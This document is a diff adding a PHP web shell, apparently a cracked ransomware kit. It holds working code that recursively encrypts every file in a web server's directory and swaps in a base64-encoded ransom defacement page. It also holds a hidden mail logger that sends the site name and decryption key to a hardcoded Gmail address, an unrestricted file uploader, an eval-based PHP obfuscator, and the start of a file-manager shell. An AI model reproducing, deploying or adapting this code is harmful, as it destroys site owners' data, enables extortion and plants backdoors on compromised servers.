@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html>
+
+
+<!-- MAIL LOGGER AT LINE 127 TO THIS EMAIL TuyulJahat86@gmail.com -->
+<!-- ExploitTools.ID -->
+
+
+
+
+<head>
+   <title>RANSOM SHELL MINI Cracked by ExploitTools.ID</title>
+<style type="text/css">
+body {
+    background: #1A1C1F;
+    color: #e2e2e2;
+}
+.inpute{
+    border-style: dotted;
+    border-color: #379600;
+    background-color: transparent;
+    color: white;
+    text-align: center;
+}
+.selecte{
+    border-style: dotted;
+    border-color: green;
+    background-color: transparent;
+    color: green;
+}
+.submite{
+       border-style: dotted;
+    border-color: #4CAF50;
+    background-color: transparent;
+    color: white;
+}
+.result{
+  text-align: left;
+}
+</style>
+<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
+</head>
+<body>
+<div class="result">
+<?php
+error_reporting(0);
+set_time_limit(0);
+ini_set('memory_limit', '-1');
+class deRanSomeware
+{
+   public function shcpackInstall(){
+    if(!file_exists(".htaFuck")){
+      rename(".htaccess", ".htaFuck");
+      if(fwrite(fopen('.htaccess', 'w'), "#5H311_1NJ3C706\r\nDirectoryIndex index.php\r\nErrorDocument 404 /index.php")){
+            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
+      }
+
+
+
+
+                                                  // DIBAWAH INI ADALAH CONTENT UNTUK index.php, decode dan edit sesuka kalian
+                                                  // base64_encode
+
+      if(file_put_contents("index.php", base64_decode("CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KICAgPGhlYWQ+CgkgIDx0aXRsZT5BbGwgWW91ciBXZWJzaXRlIERhdGFiYXNlIEZpbGVzIEFyZSBFbmNyeXB0ZWQ8L3RpdGxlPgogICAgICA8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICAgIDxtZXRhIGNvbnRlbnQ9IjVIMzExXzFOSjNDNzA2IiBuYW1lPSJkZXNjcmlwdGlvbiIvPgogICAgICA8bWV0YSBjb250ZW50PSI1SDMxMV8xTkozQzcwNiIgbmFtZT0ia2V5d29yZHMiLz4KICAgICAgPG1ldGEgcHJvcGVydHk9Im9nOmltYWdlIiBjb250ZW50PSJodHRwOi8vczI5LnBvc3RpbWcub3JnLzdydTJxNzZqYi9rY3dfbG9nb19kZWZhY2UucG5nIiAvPgoKICAgICAgPGxpbmsgaHJlZj0iaHR0cDovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9QmxhY2srT3BzK09uZXxNb250c2VycmF0fENhYmluK1NrZXRjaHxPcmJpdHJvbnxBcmNoaXRlY3RzK0RhdWdodGVyfFBlcm1hbmVudCtNYXJrZXJ8THVja2llc3QrR3V5fENoZXJyeStDcmVhbStTb2RhIiByZWw9InN0eWxlc2hlZXQiIC8+CiAgICAgIDxsaW5rIGhyZWY9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL2FuaW1hdGUuY3NzLzMuNS4yL2FuaW1hdGUubWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgogICAgICA8bGluayBocmVmPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9mb250LWF3ZXNvbWUvNC43LjAvY3NzL2ZvbnQtYXdlc29tZS5taW4uY3NzIiByZWw9InN0eWxlc2hlZXQiIC8+CiAgICAgIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHA6Ly9jb2RlLmpxdWVyeS5jb20vanF1ZXJ5LWxhdGVzdC5taW4uanMiPjwvc2NyaXB0PgogICAgICAKCiAgICAgIDwhLS0gQ1NTIFNUQVJUIEhFUkUgLS0+CiAgICAgIDxzdHlsZT4KCQkgaHRtbCwgYm9keSB7bWluLWhlaWdodDogMTAwJTt9CiAgICAgICAgIGJvZHkgewoJCSB3aWR0aDogMTAwJTsKCQkgaGVpZ2h0OiAxMDAlOwogICAgICAgICBtYXJnaW46IDA7CiAgICAgICAgIHBhZGRpbmc6IDA7CiAgICAgICAgIGJhY2tncm91bmQtaW1hZ2U6IHVybCgnaHR0cHM6Ly9pbWFnZXM0LmFscGhhY29kZXJzLmNvbS82MzQvdGh1bWItMTkyMC02MzQ0NC5qcGcnKTsKICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzAwMDsKICAgICAgICAgYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDsKICAgICAgICAgYmFja2dyb3VuZC1wb3NpdGlvbjogY2VudGVyOwogICAgICAgICBiYWNrZ3JvdW5kLXNpemU6IDE1MCU7CiAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMwMDA7CiAgICAgICAgIGNvbG9yOiAjRkZGRkZGOwogICAgICAgICBmb250LWZhbWlseToiT3JiaXRyb24iOwogICAgICAgICBmb250LXNpemU6IDE0cHQ7CiAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgICAgICB9IAogICAgICAgICBhIHsgdGV4dC1kZWNvcmF0aW9uOiBub25lOyB9CiAgICAgICAgIC52aXMgewoJCSAgdGV4dC1zaGFkb3c6IDJweCAycHggMnB4ICMwMDA7CgkJIH0KICAgICAgICAgLmdsb3cgewogICAgICAgICB0ZXh0LXNoYWRvdzogMCAwIDEwcHggI0Y1OTcwMDsKICAgICAgICAgZm9udC1mYW1pbHk6IkJsYWNrIE9wcyBPbmUiOwogICAgICAgICB9CiAgICAgICAgIC5ibHVlZ2xvdyB7CiAgICAgICAgIHRleHQtc2hhZG93OiAwIDAgMTBweCAjMEY2RkJEOwogICAgICAgICBmb250LWZhbWlseToiQmxhY2sgT3BzIE9uZSIKICAgICAgICAgfQogICAgICAgICAud2hpdGVnbG93LC5ndyB7CiAgICAgICAgIHRleHQtc2hhZG93OiAwIDAgNXB4ICNGRkZGRkY7CiAgICAgICAgIGZvbnQtZmFtaWx5OiJCbGFjayBPcHMgT25lIjsKICAgICAgICAgfQoKICAgICAgICAgI2hlbGxvIHsKICAgICAgICAgZm9udC1zaXplOiAyMHB4OwogICAgICAgICAtbW96LXRyYW5zaXRpb246IGNvbG9yIDFzOwogICAgICAgICAtd2Via2l0LXRyYW5zaXRpb246IGNvbG9yIDFzOwogICAgICAgICAtbXMtdHJhbnNpdGlvbjogY29sb3IgMXM7CiAgICAgICAgIC1vLXRyYW5zaXRpb246IGNvbG9yIDFzOwogICAgICAgICB0cmFuc2l0aW9uOiBjb2xvciAxLjJzOwogICAgICAgICBmb250LWZhbWlseToiQmxhY2sgT3BzIE9uZSIKICAgICAgICAgfQogICAgICAgICAjaGVsbG86aG92ZXIgewogICAgICAgICBjb2xvcjogeWVsbG93OwogICAgICAgICAtd2Via2l0LXN0cm9rZS13aWR0aDogMTBweDsKICAgICAgICAgLXdlYmtpdC1zdHJva2UtY29sb3I6ICNGRkZGRkY7CiAgICAgICAgIC13ZWJraXQtZmlsbC1jb2xvcjogI0ZGRkZGRjsKICAgICAgICAgdGV4dC1zaGFkb3c6IDFweCAwcHggMjBweCByZWQ7CiAgICAgICAgIGZvbnQtZmFtaWx5OiJCbGFjayBPcHMgT25lIgogICAgICAgICB9CiAgICAgICAgIC5jbjEsLmdnIHsKICAgICAgICAgdGV4dC1zaGFkb3c6IDAgMCAxM3B4ICM1N2Y5Mjc7CiAgICAgICAgIGZvbnQtZmFtaWx5OiJCbGFjayBPcHMgT25lIjsKICAgICAgICAgfQogICAgICAgICAuY25hLC5nbyB7CiAgICAgICAgIHRleHQtc2hhZG93OiAwIDAgMTNweCAjZjk5OTFkOwogICAgICAgICBmb250LWZhbWlseToiQmxhY2sgT3BzIE9uZSI7CiAgICAgICAgIH0KICAgICAgICAgLmdyIHsKICAgICAgICAgdGV4dC1zaGFkb3c6IDAgMCAxM3B4IHJlZDsKICAgICAgICAgZm9udC1mYW1pbHk6IkJsYWNrIE9wcyBPbmUiOwogICAgICAgICB9CiAgICAgICAgIC5rY3dpbWcgeyAKICAgICAgICAgd2lkdGg6IDE2MHB4OwogICAgICAgICBoZWlnaHQ6IDE0MHB4OyAKICAgICAgICAgfSAKICAgICAgICAgLmNhcHMgewogICAgICAgICB0ZXh0LXRyYW5zZm9ybTogdXBwZXJjYXNlOwogICAgICAgICBmb250LWZhbWlseTogIkNhYmluIFNrZXRjaCI7CiAgICAgICAgIH0KCiAgICAgICAgICNuZW9uZm9udAogICAgICAgICB7CiAgICAgICAgIHRleHQtc2hhZG93OiAwIDAgNXB4IHJlZDsKICAgICAgICAgLXdlYmtpdC10cmFuc2l0aW9uOiB0ZXh0LXNoYWRvdyAycyBlYXNlLW91dDsKICAgICAgICAgLW1vei10cmFuc2l0aW9uOiB0ZXh0LXNoYWRvdyAycyBlYXNlLW91dDsKICAgICAgICAgLW8tdHJhbnNpdGlvbjogdGV4dC1zaGFkb3cgMnMgZWFzZS1vdXQ7CiAgICAgICAgIHRyYW5zaXRpb246IHRleHQtc2hhZG93IDJzIGVhc2Utb3V0OwogICAgICAgICBmb250LXNpemU6MzVweDsKICAgICAgICAgZm9udC13ZWlnaHQ6IGJvbGRlcjsKICAgICAgICAgfQogICAgICAgICAjbmVvbmZvbnQ6aG92ZXJ7CiAgICAgICAgIHRleHQtc2hhZG93OiAwIDAgMzBweCByZWQ7CiAgICAgICAgIH0KICAgICAgICAgLm1lZ2EgewogICAgICAgICB0ZXh0LXNoYWRvdzogNHB4IDAgOHB4ICMwMDczQjk7CiAgICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkZXI7CiAgICAgICAgIGZvbnQtZmFtaWx5OiAiQXJjaGl0ZWN0cyBEYXVnaHRlciI7CiAgICAgICAgIH0KICAgICAgICAgLndlYXJlIHsKICAgICAgICAgZm9udC1mYW1pbHk6ICJQZXJtYW5lbnQgTWFya2VyIjsKICAgICAgICAgdGV4dC1zaGFkb3c6IDAgMCAzcHggcmVkOwogICAgICAgICBmb250LXNpemU6IDEuM2VtOwogICAgICAgICB9CiAgICAgICAgIC50aHVtYiB7CiAgICAgICAgIHdpZHRoOiAxNTBweDsgCiAgICAgICAgIGhlaWdodDogMTkwcHg7IAogICAgICAgICBtYXJnaW46IDcwcHggYXV0bzsKICAgICAgICAgcGVyc3BlY3RpdmU6IDEwMDBweDsKICAgICAgICAgfQogICAgICAgICAudGh1bWIgc3BhbiB7CiAgICAgICAgIGRpc3BsYXk6IGJsb2NrOyB3aWR0aDogMTAwJTsgaGVpZ2h0OiAxMDAlOwogICAgICAgICBiYWNrZ3JvdW5kOiAKICAgICAgICAgbGluZWFyLWdyYWRpZW50KHJnYmEoMCwgMCwgMCwgMC40KSwgcmdiYSgwLCAwLCAwLCAwLjQpKSwgdXJsKCJodHRwOi8vczI5LnBvc3RpbWcub3JnLzdydTJxNzZqYi9rY3dfbG9nb19kZWZhY2UucG5nIik7CiAgICAgICAgIGJhY2tncm91bmQtc2l6ZTogMCwgY292ZXI7CiAgICAgICAgIHRyYW5zZm9ybS1zdHlsZTogcHJlc2VydmUtM2Q7CiAgICAgICAgIHRyYW5zaXRpb246IGFsbCAwLjVzOwogICAgICAgICB9CiAgICAgICAgIGhyIHsKCQkJIGJveC1zaGFkb3c6IDNweCAzcHggM3B4IDNweCAjODg4ODg4OwoJCQkgY29sb3I6I2ZmZjsKCQkJIG1hcmdpbi1ib3R0b206IDJweDsKCQkgfQoJCSAuZ3JlZWV0IHsKCQkJIGZvbnQtZmFtaWx5OkFsZHJpY2g7Zm9udC13ZWlnaHQ6Ym9sZDtmb250LXNpemU6MTdweDsKCQkgfSAKCQkgLmVuaGFuY2UgewoJCQkgcGFkZGluZzogMWVtIDFlbTsKCQkJIGJhY2tncm91bmQ6dXJsKCcnKTsKCQkgfQoJCSAubm9wIHsKCQkJIGJhY2tncm91bmQ6IHJnYmEoMzIsIDMyLCAzMiwgLjQpOwogICAgICAgICAgICAgICAgICAgICAgICAgcGFkZGluZzogOHB4IDhweDsKCQkgfSAKCQkgLmlwa2V5IHsKCQkJIHdpZHRoOiAyMCU7CiAgICAgICAgICAgICB0cmFuc2l0aW9uOiB3aWR0aCAxczsKICAgICAgICAgICAgIC13ZWJraXQtdHJhbnNpdGlvbjogd2lkdGggMXM7CiAgICAgICAgICAgICAtbW96LXRyYW5zaXRpb246IHdpZHRoIDFzOwogICAgICAgICAgICAgaGVpZ2h0OiA0MHB4OwogICAgICAgICAgICAgZm9udC1mYW1pbHk6TW9udHNlcnJhdDtmb250LXdlaWdodDpib2xkO2ZvbnQtc2l6ZToyNXB4OwoJCSB9CgkJIC5pcGtleTpob3ZlciB7CgkJCSB3aWR0aDogMzAlOwoJCSB9CgkJIC5pcHR4dCB7CgkJCSB3aWR0aDogNTAlOwoJCQkgaGVpZ2h0OiA0MHB4OwoJCQkgZm9udC1mYW1pbHk6TW9udHNlcnJhdDtmb250LXdlaWdodDpib2xkO2ZvbnQtc2l6ZToxNXB4OwoJCSB9CgkJIC5idXR0b24gewoJCQkgYmFja2dyb3VuZDogIzY2NjsKCQkJIGJvcmRlcjogMXB4IHNvbGlkICNmZmY7CgkJCSBoZWlnaHQ6IDQwcHg7CgkJCSBmb250LXNpemU6IDIwcHg7CgkJCSBib3JkZXItcmFkaXVzOiA1cHggNXB4IDVweCA1cHg7CgkJCSB0ZXh0LXRyYW5zZm9ybTogdXBwZXJjYXNlOwoJCQkgY29sb3I6ICNmZmY7CgkJIH0KCQkgLmJ1dHRvbjpob3ZlciB7CgkJCSBiYWNrZ3JvdW5kOiAjMDAwOwoJCSB9CiAgICAgIDwvc3R5bGU+CiAgIDwvaGVhZD4KICAgCiAgIDxib2R5PgogICAgICA8ZW1iZWQgc3JjPSJodHRwczovL2RsLmRyb3Bib3h1c2VyY29udGVudC5jb20vcy9tbnc5MXFhb2I1MG96dmwvd2UlMjBhcmUlMjBhbm9ueW1vdXMubXAzP2RsPTAiIHdpZHRoPSIwIiBoZWlnaHQ9IjAiIC8+CiAgICAgIDxjZW50ZXI+CgkJICAKICAgICAgICAgPCEtLSB3aG8gd2UgYXJlPyAtLT4KICAgICAgICAgPGRpdiBpZD0iaGVhZGVyIj4KCQkgICA8c3BhbiBjbGFzcz0iZ2xvdyIgc3R5bGU9ImZvbnQtc2l6ZTogMzBwdDsiPuKAqjxpIGNsYXNzPSJmYSBmYS1oYW5kLW8tcmlnaHQiIGFyaWEtaGlkZGVuPSJ0cnVlIj48L2k+IEJMQUNLIFBIQU5UT00gQ1lCRVIgPGkgY2xhc3M9ImZhIGZhLWhhbmQtby1sZWZ0IiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPjwvc3Bhbj48YnIvPgoJCSAgIAkJICAKICAgICAgICAgICA8ZGl2IGNsYXNzPSJhbmltYXRlZCBmbGlwIj48c3BhbiBjbGFzcz0iYmx1ZWdsb3cgY2FwcyI+PGZvbnQgc2l6ZT0iNSI+PGkgY2xhc3M9ImZhIGZhLXJhdmVscnkiIGFyaWEtaGlkZGVuPSJ0cnVlIj48L2k+IFlPVVIgU0lURSBJUyBJTkZFQ1RFRCBCWSBSQU5TT01XQVJFIDxpIGNsYXNzPSJmYSBmYS1yYXZlbHJ5IiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPjwvZm9udD48L3NwYW4+PC9kaXY+CiAgICAgICAgIDwvZGl2PgogICAgICAgICA8IS0tIEJQQyBMb2dvIC0tPiAKICAgICAgICAgPGRpdiBjbGFzcz0idGh1bWIga2N3aW1nIj4KICAgICAgICAgICAgPHNwYW4+PC9zcGFuPgogICAgICAgICA8L2Rpdj4KICAgICAgCiAgICAgICAgIDwhLS1lbmNyeXB0IG1zZyAtLT4KICAgICAgICAgPGRpdiBjbGFzcz0iYW5pbWF0ZWQgaW5maW5pdGUgZmxhc2giPjxzcGFuIGNsYXNzPSJnciIgc3R5bGU9J2NvbG9yOmJsYWNrOyBmb250LWZhbWlseTogIkx1Y2tpZXN0IEd1eSInPjxmb250IHNpemU9IjUiPjxpIGNsYXNzPSJmYSBmYS1sb2NrIiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPiBZT1VSIEZJTEVTIEhBVkUgQkVFTiBFTkNSWVBURUQgPGkgY2xhc3M9ImZhIGZhLWxvY2siIGFyaWEtaGlkZGVuPSJ0cnVlIj48L2k+PC9mb250Pjwvc3Bhbj48L2Rpdj4KICAgICAgICAgPGJyPgogICAgICAgICA8IS0tIGtleSAtLT4KICAgICAgICAgPGRpdiBjbGFzcz0ibm9wIj4KICAgICAgICAgPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+CiAgICAgICAgIDxwPjxpIGNsYXNzPSJmYSBmYS1oYW5kLW8tZG93biIgYXJpYS1oaWRkZW49InRydWUiPjwvaT4gRU5URVIgVEhFIEtFWSBUTyBERUNSWVBUIEZJTEVTIDxpIGNsYXNzPSJmYSBmYS11bmxvY2siIGFyaWEtaGlkZGVuPSJ0cnVlIj48L2k+PC9wPgogICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9Imlwa2V5IiBuYW1lPSJpb2tleSIgLz4KICAgICAgICAgPC9mb3JtPgogICAgICAgICA8L2Rpdj4gICAgICAgICA8IS0tIEk0TSAtLT4KICAgICAgICAgPGgxIHN0eWxlPSdmb250LWZhbWlseTogIkNoZXJyeSBDcmVhbSBTb2RhIjsnPjxiPuKclzxzcGFuIGNsYXNzPSJtZWdhIj41SDMxMV8xTkozQzcwNjwvc3Bhbj7inJc8L2I+PC9oMT4KICAgICAgICAgPGJyPgogICAgICAgICA8YnI+CiAgICAgICAgIAoKICAgICAgICAgPCEtLSB3YXJuaW5nIC0tPgogICAgICAgICAgIDxkaXYgY2xhc3M9IndlYXJlIj5XZSBhcmUgTGVnaW9uLi4uIFdlIGRvIG5vdCBGb3JnaXZlLi4uIFdlIGRvIG5vdCBGb3JnZXQuLi4gPGI+PGk+RXhwZWN0IHVzPC9pPjwvYj48L2Rpdj4KICAgICAgICAgICA8YnI+CiAgIDwvYm9keT4KPC9odG1sPg=="))){
+            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  index.php (Default Page)<br>';
+      }
+    }
+   }
+   public function shcpackUnstall(){
+
+      if( file_exists(".htaFuck") ){
+        if( unlink(".htaccess") && unlink("index.php") ){
+          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
+          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> index.php (Default Page)<br>';
+        }
+        rename(".htaFuck", ".htaccess");
+      }
+
+   }
+
+   public function plus(){
+      flush();
+      ob_flush();
+   }
+   public function locate(){
+        return getcwd();
+    }
+   public function shcdirs($dir,$method,$key){
+        switch ($method) {
+          case '1':
+            deRanSomeware::shcpackInstall();
+          break;
+          case '2':
+           deRanSomeware::shcpackUnstall();
+          break;
+        }
+        foreach(scandir($dir) as $d)
+        {
+            if($d!='.' && $d!='..')
+            {
+                $locate = $dir.DIRECTORY_SEPARATOR.$d;
+                if(!is_dir($locate)){
+                   if(  deRanSomeware::kecuali($locate,"ransmini.php")  && deRanSomeware::kecuali($locate,".pnjg")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"index.php") &&  deRanSomeware::kecuali($locate,"indehx.php") && deRanSomeware::kecuali($locate,".htalol") ){
+                     switch ($method) {
+                        case '1':
+                           deRanSomeware::shcEnCry($key,$locate);
+                           deRanSomeware::shcEnDesDirS($locate,"1");
+                        break;
+                        case '2':
+                           deRanSomeware::shcDeCry($key,$locate);
+                           deRanSomeware::shcEnDesDirS($locate,"2");
+                        break;
+                     }
+                   }
+                }else{
+                  deRanSomeware::shcdirs($locate,$method,$key);
+                }
+            }
+            deRanSomeware::plus();
+        }
+        deRanSomeware::report($key);
+   }
+
+
+
+        // MAIL LOGGER
+   public function report($key){
+        $message.= "=========    Tuyuljahat    =========\n";
+        $message.= "Website : ".$_SERVER['HTTP_HOST'];
+        $message.= "Key     : ".$key;
+        $message.= "========= Ransomware =========\n";
+        $subject = "Report Ransomeware";
+        $headers = "From: Tuyul <TuyulJahat86@gmail.com>\r\n";
+        mail("TuyulJahat86@gmail.com",$subject,$message,$headers);
+   }
+      // MAIL LOGGER
+
+
+
+   public function shcEnDesDirS($locate,$method){
+      switch ($method) {
+        case '1':
+          rename($locate, $locate.".Encrypted");
+        break;
+        case '2':
+          $locates = str_replace(".Encrypted", "", $locate);
+          rename($locate, $locates);
+        break;
+      }
+   }
+
+   public function shcEnCry($key,$locate){
+      $data = file_get_contents($locate);
+      $iv = mcrypt_create_iv(
+          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
+          MCRYPT_DEV_URANDOM
+      );
+
+      $encrypted = base64_encode(
+          $iv .
+          mcrypt_encrypt(
+              MCRYPT_RIJNDAEL_128,
+              hash('sha256', $key, true),
+              $data,
+              MCRYPT_MODE_CBC,
+              $iv
+          )
+      );
+      if(file_put_contents($locate,  $encrypted )){
+         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Encrypted</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
+      }else{
+         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Encrypted</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
+      }
+   }
+
+   public function shcDeCry($key,$locate){
+      $data = base64_decode( file_get_contents($locate) );
+      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
+
+      $decrypted = rtrim(
+          mcrypt_decrypt(
+              MCRYPT_RIJNDAEL_128,
+              hash('sha256', $key, true),
+              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
+              MCRYPT_MODE_CBC,
+              $iv
+          ),
+          "\0"
+      );
+      if(file_put_contents($locate,  $decrypted )){
+         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Decrypted</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
+      }else{
+         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Decrypted</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
+      }
+   }
+
+
+
+   public function kecuali($ext,$name){
+        $re = "/({$name})/";
+        preg_match($re, $ext, $matches);
+        if($matches[1]){
+            return false;
+        }
+            return true;
+     }
+}
+
+if($_POST['submit']){
+switch ($_POST['method']) {
+   case '1':
+      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
+   break;
+   case '2':
+     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
+   break;
+}
+}else{
+?>
+<center>
+<div style='font-size;color:red;'>
+
+<pre>
+@@@@@                                        @@@@@  
+@@@@@@@                                      @@@@@@@
+@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
+ @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@ 
+     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@      
+       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@        
+         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@          
+            @@@@@@@    @@@@@@    @@@@@@             
+            @@@@@@      @@@@      @@@@@             
+            @@@@@@      @@@@      @@@@@             
+             @@@@@@    @@@@@@    @@@@@              
+              @@@@@@@@@@@  @@@@@@@@@@               
+               @@@@@@@@@@  @@@@@@@@@                
+           @@   @@@@@@@@@@@@@@@@@   @@              
+           @@@@  @@@@ @ @ @ @ @@@@  @@@@            
+          @@@@@   @@@ @ @ @ @ @@@   @@@@@           
+        @@@@@      @@@@@@@@@@@@@      @@@@@         
+      @@@@          @@@@@@@@@@@          @@@@       
+   @@@@@              @@@@@@@              @@@@@    
+  @@@@@@@                                 @@@@@@@   
+   @@@@@                                   @@@@@    
+
+ -[ Contact : HackerBaloch07@gmail.com ]-<br><br>
+ CRACKED By ExploitTools.ID<br>
+</pre>
+<form action="" method="post" style=" text-align: center;">
+      <label>Key : </label>
+      <input type="text" name="key" class="inpute" placeholder="Password Key">
+      <select name="method" class="selecte">
+         <option value="1">Locked</option>
+         <option value="2">Unlocked</option>
+      </select>
+      <input type="submit" name="submit" class="submite" value="Submit" />
+</form>
+
+<?php
+}?>
+<br>
+
+<hr>
+
+<br><br>
+<h2><font color='red' face = 'iceland' > Uploader</h2> </font>
+<?php
+ $files = @$_FILES["files"];
+ if ($files["name"] != '') { 
+ $fullpath = $_REQUEST["path"] . $files["name"];
+ if (move_uploaded_file($files['tmp_name'],
+ $fullpath)) {
+ echo "<a href='$fullpath' target='_blank'>Akses
+ untuk $fullpath</a>";
+ } 
+ }echo '<form method=POST
+ enctype="multipart/form-data" action=""><input
+ type="file" name="files"><input type=submit
+ value="Fire!"></form></body></html>';?>
+ <br>
+ </center>
+ </div>
+</html>
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+    
+    <style>
+  body {
+        background-color: black;
+      }
+      body {
+        color: red;
+        font-size: 100%;
+        font-weight: bold;
+        font-family: Courier;
+        
+        background-color: black; 
+      }
+input {
+  color: red;
+        color: red;
+        font-size: 100%;
+        font-weight: bold;
+        font-family: Courier;
+        border: 2px solid red;
+    border-radius: 4px;
+        background-color: black; 
+  
+
+
+
+
+}
+textarea {
+        color: red;
+        font-size: 100%;
+        font-weight: bold;
+        font-family: Courier;
+        border: 2px solid red;
+    border-radius: 4px;
+        background-color: black; 
+      }
+#content tr:hover{
+                background-color: black;
+                text-shadow:0px 0px 10px red;
+            }
+            #content .first{
+                background-color: black;
+            }
+            
+            
+            a{
+                color: red;
+                text-decoration: none;
+            }
+            
+  </style>
+  </head>
+
+  <body>
+    <div class="heading">
+    <font><center><h1>Php Obfuscator By 5H311_1NJ3C706</h1></center></font>
+    </div>
+    <div class="subheading">
+    <center>  <h3><font>paste your php code inside hit Enter done :P</font></h3></center>
+    </div>
+    <div class="input">
+      <form action="" method="POST">
+      <center>  <textarea rows="9" cols="85" type="text" name="php" placeholder="Input Php Code Here"></textarea><br><br>
+        </center>
+      <center>  <input type="submit" name="submit" value="Submit" /><br>
+        </center>
+        <?php
+          if (isset($_POST['submit'])) {
+          $phpcode = $_POST['php'];
+            if (!empty($phpcode)) {
+              
+              $website = "http://".$_SERVER['HTTP_HOST'];
+              $file_location = htmlspecialchars($_SERVER['REQUEST_URI']);
+              $all_in_one = $website.$file_location;
+              
+            
+          
+          
+
+                $obfuscate_high_level = strrev(base64_encode(gzdeflate(gzdeflate(gzdeflate(gzcompress(gzcompress($phpcode)))))));
+                    echo ' <br><center><textarea rows="9" cols="85"> 
+<?php
+/*
+  
+                  CODE Successfully OBFUSCATED by 5H311_1NJ3C706 Obfuscator
+                        Strongest PHP obfuscator ;)
+          Dont change the variables othervise code will not work. 
+          If you are facing any problem contact me on Gmail.          
+                                                                5H311_1NJ3C706
+                            Or mail me Hackerbaloch07@gmail.com ;)
+*/
+$Cyber = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNENyaW1lJTI5JTI5JTI5JTI5JTI5JTI5JTI5JTI5JTNC";
+$Crime = "'.$obfuscate_high_level.'";
+eval(htmlspecialchars_decode(urldecode(base64_decode($Cyber))));
+exit;
+?></textarea>
+';
+                
+              } 
+            }
+          
+        ?>
+      </center>
+      </form>
+    </div>
+    <div class="footer">
+      
+    </div>
+  </body>
+</html>
+
+   <?php
+error_reporting(0);
+set_time_limit(0);
+
+if(get_magic_quotes_gpc()){
+foreach($_POST as $key=>$value){
+$_POST[$key] = stripslashes($value);
+}
+}
+echo '<!DOCTYPE HTML>
+<html>
+<head>
+<link href="" rel="stylesheet" type="text/css">
+<title>5H311_1NJ3C706</title>
+<style>
+body{
+font-family: "Courgette", cursive;
+  background-image: url(" ");
+  color:red;
+  background-attachment:fixed;
+  background-repeat:no-repeat;
+  background-position:center;
+  background-color:Black;
+  -webkit-background-size: 100% 100%;
+}
+h1{
+color:red;
+-webkit-text-stroke: 0px #5ddcfc;
+}
+#content tr:hover{
+background-color:  #5ddcfc;
+text-shadow:1px 1px 0px #000;
+}
+#content .first{
+color:red;
+background-color: #5ddcfc;
+}
+table{
+border: 0px #9435dd solid;
+}
+a{
+color:red;
+text-decoration: none;
+}
+a:hover{
+color:#9435dd;
+text-shadow:0px 1px 0px #000;
+}
+input,select,textarea{
+font-family: Courgette;
+background-color:black;
+color:#5ddcfc;
+border: 1px red solid;
+-moz-border-radius: 5px;
+-webkit-border-radius:5px;
+border-radius:5px;
+
+}
+</style>
+</head>
+<body>
+<link href="https://fonts.googleapis.com/css?family=Courgette" rel="stylesheet">
+<center>
+<h1>CRACKER BY 5H311_1NJ3C706 </h1></center>
+<table width="700" border="0" cellpadding="4" cellspacing="1"align="center">
+<tr><td><font color="#5ddcfc">Current Dir :</font> ';
+if(isset($_GET['path'])){
+$path = $_GET['path'];
+}else{
+$path = getcwd();
+}
+$path = str_replace('\\','/',$path);
+$paths = explode('/',$path);
+
+foreach($paths as $id=>$pat){
